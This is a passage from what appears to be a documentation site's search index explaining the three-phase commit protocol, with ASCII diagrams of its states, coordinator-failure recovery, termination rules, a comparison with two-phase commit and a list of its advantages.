\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                           \u2502\n\u2502                       \u2502                                 \u2502\n\u2502                       \u2502 Receive CAN-COMMIT              \u2502\n\u2502                       \u25bc                                 \u2502\n\u2502                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                           \u2502\n\u2502                  \u2502CAN-COMMIT\u2502                           \u2502\n\u2502                  \u2502  (vote)  \u2502                           \u2502\n\u2502                  \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                           \u2502\n\u2502                       \u2502                                 \u2502\n\u2502                  \u250c\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2510                            \u2502\n\u2502                  \u2502         \u2502                            \u2502\n\u2502         Can      \u25bc         \u25bc       Cannot               \u2502\n\u2502         commit \u250c\u2500\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u2500\u2510   commit                \u2502\n\u2502         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2502 YES \u2502  \u2502 NO  \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                 \u2502\n\u2502         \u2502      \u2514\u2500\u2500\u252c\u2500\u2500\u2518  \u2514\u2500\u2500\u252c\u2500\u2500\u2518       \u2502                 \u2502\n\u2502         \u2502         \u2502        \u2502          \u2502                 \u2502\n\u2502         \u2502         \u2502 Wait   \u2502 Vote NO  \u2502                 \u2502\n\u2502         \u2502         \u25bc        \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502         \u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510               \u2502     \u2502           \u2502\n\u2502         \u2502    \u2502  WAIT  \u2502               \u2502     \u2502           \u2502\n\u2502         \u2502    \u2502(for msg\u2502               \u2502     \u2502           \u2502\n\u2502         \u2502    \u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518               \u2502     \u2502           \u2502\n\u2502         \u2502        \u2502                    \u2502     \u2502           \u2502\n\u2502         \u2502   \u250c\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2510               \u2502     \u2502           \u2502\n\u2502         \u2502   \u2502         \u2502               \u2502     \u2502           \u2502\n\u2502         \u2502   \u25bc         \u25bc               \u2502     \u2502           \u2502\n\u2502         \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u2502     \u2502           \u2502\n\u2502         \u2502 \u2502  PRE-  \u2502 \u2502 ABORT  \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2518     \u2502           \u2502\n\u2502         \u2502 \u2502 COMMIT \u2502 \u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518            \u2502           \u2502\n\u2502         \u2502 \u2502\u2b50 NEW! \u2502     \u2502                 \u2502           \u2502\n\u2502         \u2502 \u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518     \u2502                 \u2502           \u2502\n\u2502         \u2502     \u2502          \u2502                 \u2502           \u2502\n\u2502         \u2502     \u2502 Wait for \u2502 Rollback        \u2502           \u2502\n\u2502         \u2502     \u2502DO-COMMIT \u2502                 \u2502           \u2502\n\u2502         \u2502     \u2502          \u2502                 \u2502           \u2502\n\u2502         \u2502 \u250c\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2510     \u2502                 \u2502           \u2502\n\u2502         \u2502 \u2502 Timeout\u2502     \u2502                 \u2502           \u2502\n\u2502         \u2502 \u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518     \u2502                 \u2502           \u2502\n\u2502         \u2502     \u2502          \u2502                 \u2502           \u2502\n\u2502         \u2502     \u25bc          \u2502                 \u2502           \u2502\n\u2502         \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u2502                 \u2502           \u2502\n\u2502         \u2514\u2192\u2502 COMMIT \u2502     \u2502   \u2b50 Can commit \u2502           \u2502\n\u2502           \u2502(forced)\u2502     \u2502     on timeout! \u2502           \u2502\n\u2502           \u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518     \u2502                 \u2502           \u2502\n\u2502               \u2502          \u2502                 \u2502           \u2502\n\u2502               \u25bc          \u25bc                 \u25bc           \u2502\n\u2502           \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502           \u2502           END                    \u2502         \u2502\n\u2502           \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 Key: After PRE-COMMIT, if timeout \u2192 COMMIT              \u2502\n\u2502      (Non-blocking!)                                    \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#67-how-three-phase-commit-handles-coordinator-failure","title":"6.7 How Three-Phase Commit Handles Coordinator Failure","text":"<p>The Non-Blocking Property:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    3PC: HANDLING COORDINATOR FAILURE (NON-BLOCKING)     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Scenario 1: Coordinator fails BEFORE PreCommit         \u2502\n\u2502 \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550         \u2502\n\u2502                                                         \u2502\n\u2502 Timeline:                                               \u2502\n\u2502 t1    Coordinator sends CAN-COMMIT?                     \u2502\n\u2502 t2    Participants vote YES                             \u2502\n\u2502 t3    \ud83d\udca5 COORDINATOR CRASHES \ud83d\udca5                         \u2502\n\u2502       (Before sending PRE-COMMIT)                       \u2502\n\u2502                                                         \u2502\n\u2502 Participant Recovery:                                   \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \u2022 Voted YES, waiting for message         \u2502           \u2502\n\u2502 \u2502 \u2022 Timeout expires                        \u2502           \u2502\n\u2502 \u2502 \u2022 Check state: Not yet PRE-COMMITTED     \u2502           \u2502\n\u2502 \u2502 \u2022 Decision: ABORT (safe!)                \u2502           \u2502\n\u2502 \u2502 \u2022 Reasoning: Transaction not committed   \u2502           \u2502\n\u2502 \u2502   yet, so aborting is safe               \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 \u2705 Result: Participants abort independently             \u2502\n\u2502    No blocking! System makes progress.                  \u2502\n\u2502                                                         \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500         \u2502\n\u2502                                                         \u2502\n\u2502 Scenario 2: Coordinator fails AFTER PreCommit          \u2502\n\u2502 \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550            \u2502\n\u2502                                                         \u2502\n\u2502 Timeline:                                               \u2502\n\u2502 t1    Coordinator sends CAN-COMMIT?                     \u2502\n\u2502 t2    Participants vote YES                             \u2502\n\u2502 t3    Coordinator sends PRE-COMMIT                      \u2502\n\u2502 t4    Participants acknowledge PRE-COMMIT               \u2502\n\u2502 t5    \ud83d\udca5 COORDINATOR CRASHES \ud83d\udca5                         \u2502\n\u2502       (Before sending DO-COMMIT)                        \u2502\n\u2502                                                         \u2502\n\u2502 Participant Recovery:                                   \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \u2022 Entered PRE-COMMITTED state            \u2502           \u2502\n\u2502 \u2502 \u2022 Timeout expires (no DO-COMMIT)         \u2502           \u2502\n\u2502 \u2502 \u2022 Check state: Already PRE-COMMITTED     \u2502           \u2502\n\u2502 \u2502 \u2022 Decision: COMMIT (safe!)               \u2502           \u2502\n\u2502 \u2502 \u2022 Reasoning: Coordinator decided to      \u2502           \u2502\n\u2502 \u2502   commit, all participants agreed        \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 \u2705 Result: Participants commit independently            \u2502\n\u2502    No blocking! Transaction completes.                  \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Termination Protocol (Participant Self-Recovery):</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    3PC TERMINATION PROTOCOL (PARTICIPANT RECOVERY)      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 When coordinator fails, participant runs:               \u2502\n\u2502                                                         \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                \u2502\n\u2502 \u2502  TERMINATION PROTOCOL               \u2502                \u2502\n\u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                \u2502\n\u2502 \u2502                                     \u2502                \u2502\n\u2502 \u2502 1. Detect timeout (coordinator      \u2502                \u2502\n\u2502 \u2502    not responding)                  \u2502                \u2502\n\u2502 \u2502                                     \u2502                \u2502\n\u2502 \u2502 2. Contact other participants       \u2502                \u2502\n\u2502 \u2502    (find alive participants)        \u2502                \u2502\n\u2502 \u2502                                     \u2502                \u2502\n\u2502 \u2502 3. Gather states from all alive     \u2502                \u2502\n\u2502 \u2502    participants                     \u2502                \u2502\n\u2502 \u2502                                     \u2502                \u2502\n\u2502 \u2502 4. Apply decision rules:            \u2502                \u2502\n\u2502 \u2502                                     \u2502                \u2502\n\u2502 \u2502    IF any participant in ABORT:     \u2502                \u2502\n\u2502 \u2502       \u2192 ALL ABORT                   \u2502                \u2502\n\u2502 \u2502                                     \u2502                \u2502\n\u2502 \u2502    ELSE IF any in PRE-COMMITTED:    \u2502                \u2502\n\u2502 \u2502       \u2192 ALL COMMIT                  \u2502                \u2502\n\u2502 \u2502                                     \u2502                \u2502\n\u2502 \u2502    ELSE IF any in COMMITTED:        \u2502                \u2502\n\u2502 \u2502       \u2192 ALL COMMIT                  \u2502                \u2502\n\u2502 \u2502                                     \u2502                \u2502\n\u2502 \u2502    ELSE (all in WAIT):              \u2502                \u2502\n\u2502 \u2502       \u2192 ALL ABORT                   \u2502                \u2502\n\u2502 \u2502                                     \u2502                \u2502\n\u2502 \u2502 5. Execute decision                 \u2502                \u2502\n\u2502 \u2502                                     \u2502                \u2502\n\u2502 \u2502 6. Inform other participants        \u2502                \u2502\n\u2502 \u2502                                     \u2502                \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                \u2502\n\u2502                                                         \u2502\n\u2502 Key Insight:                                            \u2502\n\u2502 The state information is sufficient to make             \u2502\n\u2502 a safe decision without coordinator!                    \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Comparison: 2PC vs 3PC Coordinator Failure:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    COORDINATOR FAILURE: 2PC vs 3PC                      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 2PC (BLOCKING):                                         \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 Coordinator crashes after PREPARE        \u2502           \u2502\n\u2502 \u2502                                          \u2502           \u2502\n\u2502 \u2502 Participant state: READY                 \u2502           \u2502\n\u2502 \u2502 \u2022 Voted YES                              \u2502           \u2502\n\u2502 \u2502 \u2022 Waiting for decision                   \u2502           \u2502\n\u2502 \u2502                                          \u2502           \u2502\n\u2502 \u2502 Problem:                                 \u2502           \u2502\n\u2502 \u2502 \u2022 Cannot abort (others might commit)     \u2502           \u2502\n\u2502 \u2502 \u2022 Cannot commit (decision unknown)       \u2502           \u2502\n\u2502 \u2502 \u2022 BLOCKED indefinitely \u274c                \u2502           \u2502\n\u2502 \u2502                                          \u2502           \u2502\n\u2502 \u2502 Impact:                                  \u2502           \u2502\n\u2502 \u2502 \u2022 Locks held until coordinator recovers  \u2502           \u2502\n\u2502 \u2502 \u2022 System unavailable                     \u2502           \u2502\n\u2502 \u2502 \u2022 Cascading failures                     \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 3PC (NON-BLOCKING):                                     \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 Coordinator crashes after PRE-COMMIT     \u2502           \u2502\n\u2502 \u2502                                          \u2502           \u2502\n\u2502 \u2502 Participant state: PRE-COMMITTED         \u2502           \u2502\n\u2502 \u2502 \u2022 Voted YES                              \u2502           \u2502\n\u2502 \u2502 \u2022 Received PRE-COMMIT                    \u2502           \u2502\n\u2502 \u2502                                          \u2502           \u2502\n\u2502 \u2502 Solution:                                \u2502           \u2502\n\u2502 \u2502 \u2022 KNOWS all voted YES                    \u2502           \u2502\n\u2502 \u2502 \u2022 KNOWS transaction will commit          \u2502           \u2502\n\u2502 \u2502 \u2022 Can COMMIT independently \u2705            \u2502           \u2502\n\u2502 \u2502                                          \u2502           \u2502\n\u2502 \u2502 Impact:                                  \u2502           \u2502\n\u2502 \u2502 \u2022 Locks released after timeout           \u2502           \u2502\n\u2502 \u2502 \u2022 System remains available               \u2502           \u2502\n\u2502 \u2502 \u2022 Transaction completes                  \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#68-advantages-of-three-phase-commit","title":"6.8 Advantages of Three-Phase Commit","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         3PC ADVANTAGES                                  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. \u2705 NON-BLOCKING UNDER SINGLE FAILURES                \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Coordinator failure recoverable    \u2502            \u2502\n\u2502    \u2502 \u2022 Participants can make progress     \u2502            \u2502\n\u2502    \u2502 \u2022 No indefinite waiting              \u2502            \u2502\n\u2502    \u2502 \u2022 System remains available           \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 2. \u2705 IMPROVED AVAILABILITY                             \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Better fault tolerance             \u2502            \u2502\n\u2502    \u2502 \u2022 Shorter lock holding periods       \u2502            \u2502\n\u2502    \u2502 \u2022 Reduced blocking time              \u2502            \u2502\n\u2502    \u2502 \u2022 Graceful degradation               \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 3. \u2705 ATOMICITY STILL GUARANTEED                        \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 All-or-nothing across nodes        \u2502            \u2502\n\u2502    \u2502 \u2022 Consistency maintained             \u2502            \u2502\n\u2502    \u2502 \u2022 ACID properties preserved          \u2502            \u2502\n\u2502    \u2502 \u2022 No partial commits                 \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 4. \u2705 TERMINATION PROTOCOL                              \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Participants can elect new leader  \u2502            \u2502\n\u2502    \u2502 \u2022 Cooperative decision making        \u2502            \u2502\n\u2502    \u2502 \u2022 Distributed recovery               \u2502            \u2502\n\u2502    \u2502 \u2022 No single point of failure         \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 5. \u2705 CLEAR STATE BOUNDARIES                            \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 \"Can abort\" vs \"Will commit\" clear \u2502            \u2502\n\u2502    \u2502 \u2022 Unambiguous recovery decisions     \u2502            \u2502\n\u2502    \u2502 \u2022 Easier to reason about             \u2502            \u2502\n\u2502    \u2502 \u2022 Formal correctness proofs exist    \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 6. \u2705 BETTER THAN 2PC FOR LONG TRANSACTIONS             \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Reduces risk of indefinite block   \u2502            \u2502\n\u2502    \u2502 \u2022 Better for high-latency networks   \u2502            \u2502\n\u2502    \u2502 \u2022 Suitable for geo-distributed       \u2502            \u2502\n\u2502    